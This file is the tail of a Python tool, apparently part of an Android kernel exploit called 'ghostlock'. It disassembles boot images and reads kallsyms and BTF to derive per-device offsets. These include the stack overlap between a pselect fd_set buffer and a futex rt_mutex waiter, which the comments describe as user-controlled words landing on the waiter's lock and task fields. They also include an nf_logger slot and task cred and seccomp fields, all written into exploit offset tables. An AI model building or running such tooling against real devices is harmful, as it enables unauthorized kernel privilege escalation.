    futex_chain.append("futex_wait")

    for caller_key, callee_key in zip(pselect_chain, pselect_chain[1:]):
        validate_frame_live_at(
            dis[caller_key],
            rf"\bbl\s+0x{unique_offset(symbols, names[callee_key]):x}\b",
            names[caller_key],
        )
    for caller_key, callee_key in zip(futex_chain, futex_chain[1:]):
        validate_frame_live_at(
            dis[caller_key],
            rf"\bbl\s+0x{unique_offset(symbols, names[callee_key]):x}\b",
            names[caller_key],
        )
    frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}

    pi_tree = wake_state = None
    if btf is not None:
        pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
        wake_state = btf.field("rt_mutex_waiter", "wake_state")
        if pi_tree is None or wake_state is None:
            raise ExtractError("BTF rt_mutex_waiter.pi_tree/wake_state missing")
    waiter_candidates: list[tuple[str, int]] = []
    for reg, imm_text in re.findall(
        r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", dis["futex_wait"], re.I
    ):
        imm = int(imm_text, 16)
        if pi_tree is not None:
            if re.search(
                rf"\badd\s+x\d+,\s*{re.escape(reg)},\s*#0x{pi_tree:x}\b",
                dis["futex_wait"], re.I,
            ):
                waiter_candidates.append((reg.lower(), imm))
        elif re.search(
            rf"\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]",
            dis["futex_wait"], re.I,
        ):
            # No BTF: the waiter is memset before use, so its sp slot must
            # start a stp xzr run; require that.
            waiter_candidates.append((reg.lower(), imm))
    # Several registers may materialize the same sp local; dedupe by offset.
    waiter_candidates = list(
        {imm: (reg, imm) for reg, imm in waiter_candidates}.values()
    )
    if len(waiter_candidates) != 1:
        raise ExtractError(
            f"futex waiter stack local not unique: {waiter_candidates}"
        )
    waiter_reg, waiter_local = waiter_candidates[0]
    validate_frame_live_at(
        dis["futex_wait"],
        rf"\badd\s+{re.escape(waiter_reg)},\s*sp,\s*#0x{waiter_local:x}\b",
        names["futex_wait"],
    )
    required_fields = [waiter_local]
    if wake_state is not None:
        required_fields.append(waiter_local + wake_state)
    for required in required_fields:
        if not re.search(rf"\[sp,\s*#0x{required:x}\]", dis["futex_wait"], re.I):
            raise ExtractError(
                f"futex waiter candidate 0x{waiter_local:x} not cross-validated "
                f"by a real field store at 0x{required:x}"
            )

    add_sp: list[tuple[str, int]] = [
        (reg.lower(), int(imm, 16))
        for reg, imm in re.findall(
            r"\badd\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)",
            dis["pselect_core"], re.I,
        )
    ]
    buffer_candidates: set[int] = set()
    for reg, imm in add_sp:
        peers = {peer for peer, peer_imm in add_sp if peer_imm == imm and peer != reg}
        if any(
            re.search(rf"\bcmp\s+{re.escape(reg)},\s*{re.escape(peer)}\b",
                      dis["pselect_core"], re.I)
            or re.search(rf"\bcmp\s+{re.escape(peer)},\s*{re.escape(reg)}\b",
                         dis["pselect_core"], re.I)
            for peer in peers
        ):
            buffer_candidates.add(imm)
    if len(buffer_candidates) != 1:
        raise ExtractError(
            f"core_sys_select fd_set buffer candidates not unique: "
            f"{sorted(hex(v) for v in buffer_candidates)}"
        )
    pselect_buffer = next(iter(buffer_candidates))
    buffer_regs = sorted({
        reg for reg, imm in add_sp
        if imm == pselect_buffer
    })
    if not buffer_regs:
        raise ExtractError("core_sys_select stack buffer has no output register")
    for buffer_reg in buffer_regs:
        validate_frame_live_at(
            dis["pselect_core"],
            rf"\badd\s+{re.escape(buffer_reg)},\s*sp,\s*#0x{pselect_buffer:x}\b",
            f"{names['pselect_core']}/{buffer_reg}",
        )

    fds_bytes = ((route_nfds + 63) // 64) * 8
    thresholds = [
        int(value, 16)
        for value in re.findall(r"\bcmp\s+x\d+,\s*#0x([0-9a-f]+)",
                                dis["pselect_core"], re.I)
    ]
    if not any(fds_bytes < threshold <= fds_bytes + 8 for threshold in thresholds):
        raise ExtractError(
            f"core_sys_select threshold does not prove route_nfds={route_nfds} "
            f"uses the stack fd_set path"
        )

    pselect_word0 = -sum(frames[key] for key in pselect_chain) + pselect_buffer
    futex_waiter = -sum(frames[key] for key in futex_chain) + waiter_local
    delta = futex_waiter - pselect_word0
    if delta < 0 or delta % 8:
        raise ExtractError(f"pselect/futex overlap is not a non-negative qword: {delta}")
    shift = delta // 8
    if shift > 16:
        raise InfeasibleError(
            f"PSELECT_WAITER_WORD_SHIFT too large: {shift}"
        )
    # Feasibility: core_sys_select copies 3 x FDS_BYTES(route_nfds) fd_set
    # qwords (0..14 for nfds=320); the waiter lock at qword shift+11 must fit
    # inside, else task/lock land in the zeroed tail and the route cannot work.
    if shift > 3:
        raise InfeasibleError(
            f"futex waiter starts {shift} qwords above the fd_set buffer; "
            f"task/lock would land outside the user-controlled words 0..14 "
            f"(max feasible shift is 3)"
        )
    if shift == 3:
        print(
            "warning: waiter fits at the last usable word (shift=3); "
            "wake_state falls outside the copied fd_set and relies on the "
            "kernel zero-initialising it",
            file=sys.stderr,
        )
    return {
        "PSELECT_WAITER_WORD_SHIFT": shift,
        "waiter_local": waiter_local,
        "pselect_word0": pselect_word0,
        "futex_waiter": futex_waiter,
        "pselect_buffer": pselect_buffer,
        "chain": "->".join(names[key] for key in pselect_chain),
        "futex_chain": "->".join(names[key] for key in futex_chain),
        **{f"frame_{key}": frames[key] for key in frames},
    }


def unique_offset_optional(symbols: dict[str, set[int]], name: str) -> int | None:
    try:
        return unique_offset(symbols, name)
    except ExtractError:
        return None


def _materialized_address(text: str, register: str, address: int) -> bool:
    lines = text.splitlines()
    page = address & ~0xFFF
    page_off = address & 0xFFF
    for index, line in enumerate(lines):
        if not re.search(rf"\badrp\s+{register},\s*0x{page:x}\b", line, re.I):
            continue
        nearby = "\n".join(lines[index + 1:index + 4])
        if re.search(
            rf"\badd\s+{register},\s*{register},\s*#0x{page_off:x}\b",
            nearby, re.I,
        ):
            return True
    return False


def _u32(data: bytes, off: int) -> int:
    if off < 0 or off + 4 > len(data):
        raise ExtractError(f"u32 read out of range: 0x{off:x}")
    return struct.unpack_from("<I", data, off)[0]


def _u64(data: bytes, off: int) -> int:
    if off < 0 or off + 8 > len(data):
        raise ExtractError(f"u64 read out of range: 0x{off:x}")
    return struct.unpack_from("<Q", data, off)[0]


def _cstr(data: bytes, off: int, max_len: int = 4096) -> str:
    if off < 0 or off >= len(data):
        raise ExtractError(f"C string out of range: 0x{off:x}")
    end = data.find(b"\x00", off, min(len(data), off + max_len))
    if end < 0:
        raise ExtractError(f"unterminated C string at 0x{off:x}")
    return data[off:end].decode("utf-8", "replace")


def derive_nf_logger_registration(
    tool: str,
    kernel_path: Path,
    kernel: bytes,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf | None,
) -> dict[str, int]:
    """Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling
    nf_log_register/nfnetlink_log_init and closing the slot index against BTF
    nf_logger.type / NF_LOG_TYPE_ULOG / NFPROTO_UNSPEC."""
    register_text = disassemble_symbol(
        tool, kernel_path, symbols, sorted_offsets, "nf_log_register", 0x800
    )
    init_text = disassemble_symbol(
        tool, kernel_path, symbols, sorted_offsets, "nfnetlink_log_init", 0x800
    )
    logger = unique_offset(symbols, "nfulnl_logger")
    loggers = unique_offset(symbols, "loggers")
    type_off = btf.field("nf_logger", "type")
    if type_off is None or btf.direct_field_size("nf_logger", "type") != 4:
        raise ExtractError("BTF nf_logger.type is not a 4-byte enum")
    logger_type = _u32(kernel, logger + type_off)
    ulog_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
    max_value = btf.enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
    nfproto_unspec = btf.unique_enum_member_value("NFPROTO_UNSPEC")
    if (
        ulog_value is None or max_value is None or nfproto_unspec is None
        or logger_type != ulog_value or not (0 <= ulog_value < max_value)
    ):
        raise ExtractError(
            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: "
            f"data={logger_type}, ulog={ulog_value}, max={max_value}"
        )

    logger_aliases = set(re.findall(r"\bmov\s+(x\d+),\s*x1\b", register_text, re.I))
    if len(logger_aliases) != 1:
        raise ExtractError(
            f"nf_log_register logger alias not unique: {logger_aliases}"
        )
    logger_reg = next(iter(logger_aliases)).lower()
    type_loads = set(re.findall(
        rf"\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]",
        register_text, re.I,
    ))
    if len(type_loads) != 1:
        raise ExtractError(
            f"nf_log_register type load not unique: {type_loads}"
        )
    type_reg = next(iter(type_loads))
    base_regs = {
        match.group(1).lower()
        for match in re.finditer(r"\badrp\s+(x\d+),", register_text, re.I)
        if _materialized_address(register_text, match.group(1).lower(), loggers)
    }
    indexed: list[tuple[str, str]] = []
    for base_reg in base_regs:
        for destination, pf_reg in re.findall(
            rf"\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4",
            register_text, re.I,
        ):
            if re.search(
                rf"\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3",
                register_text, re.I,
            ):
                indexed.append((destination.lower(), pf_reg.lower()))
    indexed = list(dict.fromkeys(indexed))
    if len(indexed) != 1:
        raise ExtractError(
            f"nf_log_register loggers[pf][type] dataflow not unique: {indexed}"
        )
    slot_reg, _ = indexed[0]
    if not re.search(
        rf"\bstlr\s+{logger_reg},\s*\[{slot_reg}\]", register_text, re.I
    ):
        raise ExtractError("nf_log_register does not store the logger to the slot")
    if not re.search(rf"\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b",
                     register_text, re.I):
        raise ExtractError("nf_log_register type bound not closed with NF_LOG_TYPE_MAX")

    target = unique_offset(symbols, "nf_log_register")
    calls = [
        index for index, line in enumerate(init_text.splitlines())
        if re.search(rf"\bbl\s+0x{target:x}\b", line, re.I)
    ]
    if len(calls) != 1:
        raise ExtractError(f"nfnetlink_log_init -> nf_log_register calls: {len(calls)}")
    init_lines = init_text.splitlines()
    call_window = "\n".join(init_lines[max(0, calls[0] - 6):calls[0]])
    if nfproto_unspec != 0 or not re.search(r"\bmov\s+w0,\s*wzr\b", call_window, re.I):
        raise ExtractError("nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)")
    if not _materialized_address(init_text, "x1", logger):
        raise ExtractError("nfnetlink_log_init x1 does not materialize nfulnl_logger")
    slot = loggers + ulog_value * 8
    return {
        "loggers": loggers,
        "nfulnl_logger": logger,
        "loggers_0_1": slot,
        "nf_log_type_ulog": ulog_value,
    }



def resolve_structs(btf: Btf | None) -> dict[str, int | None]:
    result: dict[str, int | None] = {}
    if btf is None:
        for fields in STRUCT_FIELDS.values():
            for macro in fields:
                result[macro] = None
        result["struct_page_size"] = None
        result["struct_page_compound_head"] = None
        result["struct_page_type"] = None
        result["struct_slab_cache"] = None
        result["struct_mm_struct"] = None
        return result
    for struct_name, fields in STRUCT_FIELDS.items():
        if btf.struct(struct_name) is None:
            for macro in fields:
                result[macro] = None
            continue
        for macro, field_name in fields.items():
            result[macro] = btf.field(struct_name, field_name)
    for macro, struct_name in (
        ("struct_page_size", "page"),
    ):
        result[macro] = btf.size(struct_name)
    for macro, field_name in (
        ("struct_page_compound_head", "compound_head"),
        ("struct_page_type", "page_type"),
    ):
        result[macro] = btf.field("page", field_name)
    result["struct_slab_cache"] = btf.field("slab", "slab_cache")
    result["struct_mm_struct"] = btf.size("mm_struct")
    return result


def find_kallsyms(image: Path, provided: Path | None, explicit: str | None) -> tuple[Path, bool]:
    if provided is not None:
        if not provided.is_file():
            raise ExtractError(f"kallsyms file not found: {provided}")
        return provided, False
    tool = explicit or shutil.which("kallsyms-finder")
    if not tool:
        raise ExtractError("provide --kallsyms or install/pass --kallsyms-finder")
    fd, name = tempfile.mkstemp(prefix="ghostlock-kallsyms-", suffix=".txt")
    os.close(fd)
    Path(name).unlink(missing_ok=True)
    output = Path(name)
    appended = Path(f"{output}.kallsyms")
    try:
        proc = subprocess.run(
            [tool, str(image), "--output", str(output)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        if not output.exists() and appended.exists():
            appended.replace(output)
        elif appended.exists():
            appended.unlink()
        if proc.returncode or not output.exists():
            raise ExtractError(
                f"kallsyms-finder failed ({proc.returncode}): {proc.stdout[-4000:]}"
            )
        return output, True
    except Exception:
        output.unlink(missing_ok=True)
        appended.unlink(missing_ok=True)
        raise


def require_fields(values: dict[str, int | None], optional: set[str]) -> None:
    missing = [name for name, value in values.items() if value is None and name not in optional]
    if missing:
        raise ExtractError("missing required values: " + ", ".join(sorted(missing)))


KERNEL_ROOT = Path(__file__).resolve().parent.parent / "src" / "kernels"


def kernel_key(release: str | None) -> str:
    """Directory name for a kernel table: the full uname release.

    Using the exact runtime match key avoids collisions between builds that
    share a version+hash but differ in build id (e.g. -abogki... vs -ab13...).
    """
    return re.sub(r"[^A-Za-z0-9._-]", "_", release or "unknown")


def kernel_header_path(key: str) -> Path:
    return KERNEL_ROOT / key / "offsets.h"



def kernel_struct_macro(release: str | None) -> str:
    """STRUCT_OFFSETS_6_12 for 6.12+ kernels, STRUCT_OFFSETS_6_6 otherwise."""
    if release:
        match = re.match(r"^(\d+)\.(\d+)", release)
        if match and tuple(map(int, match.groups())) >= (6, 12):
            return "STRUCT_OFFSETS_6_12"
    return "STRUCT_OFFSETS_6_6"


def pselect_waiter_shift_for(release: str | None) -> int:
    """Fallback when --llvm-objdump is unavailable: 6.12 -> 0, 6.6 -> -2.
    Unreliable for kernels with a non-inlined do_pselect middle layer (e.g.
    some 6.6.77 builds put the waiter 12 words up, which is infeasible)."""
    return 0 if kernel_struct_macro(release) == "STRUCT_OFFSETS_6_12" else -2


def render_device(
    release: str | None,
    symbols: dict[str, int | None],
    structs: dict[str, int | None],
    phys: int | None,
    pselect_shift: int,
) -> str:
    lines = [f"/* {release} */", ""]
    lines.append("OFFSETS_ENTRY(")
    lines.append(f'    "{release}",')
    lines.append(f"    {kernel_struct_macro(release)},")
    if phys is not None:
        lines.append(f"    .kernel_phys_load = 0x{phys:x},")
    lines.append(f"    .pselect_waiter_shift = {pselect_shift},")
    for key, value in symbols.items():
        if value is None:
            continue
        lines.append(f"    .{key} = 0x{value:08x},")
    lines.append("),")
    reference = {
        key: value for key, value in structs.items()
        if value is not None and (
            key.startswith("struct_page")
            or key in ("struct_slab_cache", "struct_mm_struct")
        )
    }
    if reference:
        lines.append("")
        lines.append("/* BTF reference (runtime uses target.h defaults): */")
        for key, value in reference.items():
            lines.append(f"/* #define {key.upper()} 0x{value:X} */")
    return "\n".join(lines) + "\n"


def existing_entries() -> dict[str, dict[str, int]]:
    """Map each registered release to its {field: value} from kernel headers."""
    entries: dict[str, dict[str, int]] = {}
    for header in sorted(KERNEL_ROOT.glob("*/offsets.h")):
        text = header.read_text(encoding="utf-8", errors="replace")
        for match in re.finditer(r'OFFSETS_ENTRY\(\s*"([^"]+)"', text):
            release = match.group(1)
            fields: dict[str, int] = {}
            for fm in re.finditer(
                r"\.([A-Za-z0-9_]+)\s*=\s*(0x[0-9A-Fa-f]+|-?\d+)",
                text[match.end():],
            ):
                fields[fm.group(1)] = int(fm.group(2), 0)
            entries.setdefault(release, fields)
    return entries


def warn_existing_mismatches(
    release: str | None, symbols: dict[str, int | None]
) -> None:
    if not release:
        return
    existing = existing_entries().get(release)
    if not existing:
        return
    for key, value in symbols.items():
        if value is None:
            continue
        if key in existing and existing[key] != value:
            print(
                f"warning: {release} is already registered with .{key}="
                f"0x{existing[key]:08X}; this image extracts 0x{value:08X}",
                file=sys.stderr,
            )
            if key == "off_slide_loggers_0_1":
                print(
                    "warning:   loggers[0][1] is loggers + NF_LOG_TYPE_ULOG*8 "
                    "(disassembly + BTF verified and confirmed on device for "
                    "findn5/17pm); the older heuristic loggers + 0x10 was wrong.",
                    file=sys.stderr,
                )


def register_kernel(key: str) -> Path:
    """Add #include "<key>/offsets.h" to src/kernels/offsets.h if missing."""
    header = KERNEL_ROOT / "offsets.h"
    text = header.read_text(encoding="utf-8")
    include = f'#include "{key}/offsets.h"'
    if include in text:
        return header
    marker = re.search(r"^\s*\{\s*\.uname_r\s*=\s*NULL", text, re.MULTILINE)
    if marker is None:
        raise ExtractError(f"cannot locate NULL terminator in {header}")
    text = text[: marker.start()] + include + "\n" + text[marker.start():]
    header.write_text(text, encoding="utf-8")
    return header


def render_c(release: str | None, symbols: dict[str, int | None], structs: dict[str, int | None], phys: int | None, name: str, pselect_shift: int) -> str:
    lines = [f"/* Generated offsets for {release or name}. */", ""]
    lines.append("#define STRUCT_OFFSETS_EXTRACTED \\")
    task_keys = (
        "task_prio", "task_normal_prio", "task_sched_task_group", "task_pi_lock",
        "task_pi_waiters", "task_pi_top_task", "task_pi_blocked_on", "task_pid", "task_tgid",
        "task_atomic_flags", "task_real_cred", "task_cred", "task_comm",
        "task_tasks", "task_seccomp",
    )
    present = [(key, structs.get(key)) for key in task_keys if structs.get(key) is not None]
    for index, (key, value) in enumerate(present):
        suffix = " \\" if index + 1 < len(present) else ""
        if value is not None:
            lines.append(f"  .{key} = 0x{value:X},{suffix}")
    lines.append("")
    lines.append("OFFSETS_ENTRY(\"%s\"," % (release or name))
    if phys is not None:
        lines.append(f"  .kernel_phys_load=0x{phys:X},")
    lines.append(f"  .pselect_waiter_shift={pselect_shift},")
    for key, value in symbols.items():
        if value is not None:
            lines.append(f"  .{key}=0x{value:08X},")
    lines.append("),")
    lines.append("")
    lines.append("/* BTF fields not stored in kernel_offsets: */")
    for key, value in structs.items():
        if not key.startswith("task_") and value is not None:
            lines.append(f"#define {key.upper()} 0x{value:X}")
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        epilog=(
            "examples:\n"
            "  %(prog)s boot.img --kallsyms kallsyms.txt\n"
            "  %(prog)s boot.img --xbl-config xbl_config.img --register\n"
            "  %(prog)s boot.img --llvm-objdump llvm-objdump.exe --register\n"
            "  %(prog)s boot.img --format c --out offsets.h --name device"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("image", type=Path, help="boot.img, raw arm64 Image, or gzip Image")
    parser.add_argument(
        "--kallsyms", type=Path,
        help="kallsyms text file (e.g. dumped from /proc/kallsyms); "
        "skips running kallsyms-finder",
    )
    parser.add_argument(
        "--kallsyms-finder",
        help="path to the kallsyms-finder executable; auto-detected via PATH "
        "when omitted (installed by the vmlinux-to-elf pip package)",
    )
    parser.add_argument(
        "--llvm-objdump",
        help="path to llvm-objdump; auto-derive pselect_waiter_shift and the "
        "nf_logger slide slot from disassembly (auto-detected via PATH/NDK "
        "when omitted)",
    )
    parser.add_argument(
        "--xbl-config",
        type=Path,
        help="optional XBL xbl_config.img; derive kernel physical load address from its FDT",
    )
    parser.add_argument(
        "--phys",
        type=lambda x: int(x, 0),
        help="kernel physical load address; overrides the MediaTek LZ4 "
        "default (0x80000000) and is used when there is no --xbl-config",
    )
    parser.add_argument(
        "--name", default="target",
        help="device name used in the --format c output header",
    )
    parser.add_argument(
        "--format", choices=("text", "json", "c"), default="text",
        help="output format: text (default), json, or c",
    )
    parser.add_argument(
        "--register",
        action="store_true",
        help="register the kernel table in the repo under "
        "src/kernels/<release>/offsets.h (repo format)",
    )
    parser.add_argument(
        "--allow-missing",
        action="store_true",
        help="treat every unresolved symbol as optional (emit 0)",
    )
    parser.add_argument(
        "--force",
        action="store_true",
        help="overwrite an existing device header that differs",
    )
    parser.add_argument("--out", type=Path, help="write output to a file instead of stdout")
    args = parser.parse_args(argv)
    if args.register and args.out is not None:
        parser.error("--register cannot be combined with --out")

    try:
        boot = BootImage.load(args.image)
        if args.xbl_config is not None:
            args.kernel_phys_load = recover_kernel_phys_load(args.xbl_config)
        elif args.phys is not None:
            args.kernel_phys_load = args.phys
        elif boot.mtk_lz4:
            args.kernel_phys_load = MTK_DEFAULT_PHYS_LOAD
            print(
                "info: MediaTek LZ4 image; assuming kernel_phys_load="
                f"0x{MTK_DEFAULT_PHYS_LOAD:x} (DRAM base; pass --phys to "
                "override)",
                file=sys.stderr,
            )
        else:
            args.kernel_phys_load = None
        btf_raw = boot.embedded_btf()
        btf = Btf(btf_raw) if btf_raw is not None else None
        if btf is None:
            print(
                "warning: embedded BTF not found; symbols come from kallsyms "
                "and struct offsets fall back to target.h defaults",
                file=sys.stderr,
            )
        kallsyms_path, owned_kallsyms = find_kallsyms(
            args.image, args.kallsyms, args.kallsyms_finder
        )
        try:
            symbols, types = parse_kallsyms(kallsyms_path)
        finally:
            if owned_kallsyms:
                kallsyms_path.unlink(missing_ok=True)
        base = unique(symbols, "_text") or unique(symbols, "_head")
        if base is None:
            raise ExtractError("_text/_head is not unique in kallsyms")
        symbol_offsets = resolve_symbols(
            symbols, types, btf, base, boot.release()
        )
        if symbol_offsets.get("off_ashmem_fops") is None:
            scanned = scan_ashmem_fops(boot.kernel, base, symbol_offsets)
            if scanned is not None:
                symbol_offsets["off_ashmem_fops"] = scanned
                print(
                    f"info: off_ashmem_fops = 0x{scanned:08x} "
                    "(file_operations pattern scan)",
                    file=sys.stderr,
                )
        ashmem_funcs = [
            value for key, value in symbol_offsets.items()
            if key in ASHMEM_FUNCTIONS and value is not None
        ]
        if len(ashmem_funcs) == len(ASHMEM_FUNCTIONS):
            span = max(ashmem_funcs) - min(ashmem_funcs)
            if span > 0x4000:
                print(
                    f"warning: ashmem functions span 0x{span:x}; "
                    "expected a tight same-module cluster",
                    file=sys.stderr,
                )
        derived: dict[str, int] = {}
        objdump = find_llvm_objdump(args.llvm_objdump)
        if objdump is None:
            print(
                "warning: llvm-objdump not found; pselect_waiter_shift and "
                "loggers_0_1 fall back to heuristics "
                "(pass --llvm-objdump to enable auto-derivation)",
                file=sys.stderr,
            )
        else:
            with tempfile.TemporaryDirectory(prefix="ghostlock-disasm-") as tmp:
                kernel_path = Path(tmp) / "kernel.bin"
                kernel_path.write_bytes(boot.kernel)
                rel_symbols, sorted_offsets = relative_symbols(symbols, base)
                try:
                    pselect = derive_pselect_layout(
                        objdump, kernel_path, rel_symbols, sorted_offsets,
                        btf, PSELECT_ROUTE_NFDS,
                    )
                except InfeasibleError as exc:
                    print(
                        f"error: pselect route not feasible on this kernel: {exc}",
                        file=sys.stderr,
                    )
                    return 2
                except ExtractError as exc:
                    print(
                        f"warning: pselect_waiter_shift derivation failed: {exc}",
                        file=sys.stderr,
                    )
                else:
                    # Linuxoid indexes waiter words from 0, ours from 2:
                    # our shift = derived value - 2.
                    derived["pselect_waiter_shift"] = (
                        pselect["PSELECT_WAITER_WORD_SHIFT"] - 2
                    )
                    frame_parts = " ".join(
                        f"{key.split('_', 1)[1]}=0x{pselect[key]:x}"
                        for key in ("frame_pselect_wrapper", "frame_pselect_dispatch",
                                    "frame_pselect_core", "frame_futex_wrapper",
                                    "frame_futex_dispatch", "frame_futex_wait")
                        if key in pselect
                    )
                    print(
                        f"info: pselect chain {pselect['chain']} frames={frame_parts} "
                        f"buffer=0x{pselect['pselect_buffer']:x} "
                        f"waiter=0x{pselect['waiter_local']:x} "
                        f"shift={derived['pselect_waiter_shift']} "
                        f"(derived {pselect['PSELECT_WAITER_WORD_SHIFT']} - 2)",
                        file=sys.stderr,
                    )
                if btf is None:
                    print(
                        "warning: no BTF; loggers_0_1 falls back to the "
                        "loggers+0x10 heuristic",
                        file=sys.stderr,
                    )
                else:
                    try:
                        logger_info = derive_nf_logger_registration(
                            objdump, kernel_path, boot.kernel,
                            rel_symbols, sorted_offsets, btf,
                        )
                    except ExtractError as exc:
                        print(
                            f"warning: loggers_0_1 derivation failed: {exc}",
                            file=sys.stderr,
                        )
                    else:
                        derived["off_slide_loggers_0_1"] = logger_info["loggers_0_1"]
                        print(
                            f"info: nf_logger loggers=0x{logger_info['loggers']:x} "
                            f"nfulnl_logger=0x{logger_info['nfulnl_logger']:x} "
                            f"ulog={logger_info['nf_log_type_ulog']} "
                            f"slot=0x{logger_info['loggers_0_1']:x}",
                            file=sys.stderr,
                        )
        pselect_shift = derived.get(
            "pselect_waiter_shift", pselect_waiter_shift_for(boot.release())
        )
        if "pselect_waiter_shift" not in derived:
            print(
                f"warning: using heuristic pselect_waiter_shift={pselect_shift} "
                "(6.12=0, 6.6=-2); unreliable for kernels with a non-inlined "
                "do_pselect middle layer, run with --llvm-objdump to derive",
                file=sys.stderr,
            )
        if "off_slide_loggers_0_1" in derived:
            symbol_offsets["off_slide_loggers_0_1"] = derived["off_slide_loggers_0_1"]
        struct_offsets = resolve_structs(btf)
        missing = {key for key, value in symbol_offsets.items() if value is None}
        existing = existing_entries().get(boot.release() or "", {})
        tolerated = set(OPTIONAL_SYMBOLS)
        if args.allow_missing:
            tolerated.update(missing)
        for key in sorted(missing & tolerated):
            carried = existing.get(key) or 0
            symbol_offsets[key] = carried
            if carried:
                print(
                    f"warning: {key} not found in kallsyms; carried over "
                    f"0x{carried:08x} from the registered {boot.release()} entry",
                    file=sys.stderr,
                )
            else:
                print(
                    f"warning: {key} not found in kallsyms; emitted 0x00000000 "
                    "(runtime falls back to target.h default)",
                    file=sys.stderr,
                )
        require_fields(symbol_offsets, set())
        if btf is not None:
            require_fields(struct_offsets, set())
        mm_size = struct_offsets.get("struct_mm_struct")
        if mm_size is not None:
            print(
                f"info: sizeof(mm_struct)=0x{mm_size:X} "
                "(MM_STRUCT_SZ=0x500 in src/core/common.h)",
                file=sys.stderr,
            )
            if mm_size > 0x500:
                print(
                    "warning: sizeof(mm_struct) exceeds the hardcoded "
                    "MM_STRUCT_SZ slab stride",
                    file=sys.stderr,
                )
        report = {
            "release": boot.release(),
            "kimage_text_base": base,
            "kernel_phys_load": args.kernel_phys_load,
            "symbols": symbol_offsets,
            "struct_fields": struct_offsets,
            "btf_size": len(btf_raw) if btf_raw is not None else 0,
        }
        if args.register:
            release = boot.release()
            key = kernel_key(release)
            if release in existing_entries():
                # Same kernel already registered: keep one table.
                warn_existing_mismatches(release, symbol_offsets)
                if kernel_header_path(key).exists():
                    print(
                        f"info: {release} already registered; "
                        "no duplicate table created",
                        file=sys.stderr,
                    )
                    return 0
            output = render_device(
                release, symbol_offsets, struct_offsets,
                args.kernel_phys_load, pselect_shift,
            )
            target = kernel_header_path(key)
            if (
                target.exists()
                and target.read_text(encoding="utf-8") != output
                and not args.force
            ):
                raise ExtractError(
                    f"{target} already exists and differs; pass --force to "
                    "overwrite"
                )
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(output, encoding="utf-8")
            print(f"wrote {target}", file=sys.stderr)
            register_kernel(key)
            warn_existing_mismatches(release, symbol_offsets)
            return 0
        if args.format == "c":
            output = render_c(
                boot.release(), symbol_offsets, struct_offsets,
                args.kernel_phys_load, args.name, pselect_shift,
            )
        else:
            output = json.dumps(report, indent=2, sort_keys=True) + "\n"
        if args.out:
            args.out.write_text(output, encoding="utf-8")
        else:
            print(output, end="")
        missing = [key for key, value in {**symbol_offsets, **struct_offsets}.items() if value is None]
        if missing:
            print("missing:", ", ".join(sorted(missing)), file=sys.stderr)
        return 0
    except (OSError, ExtractError, struct.error) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
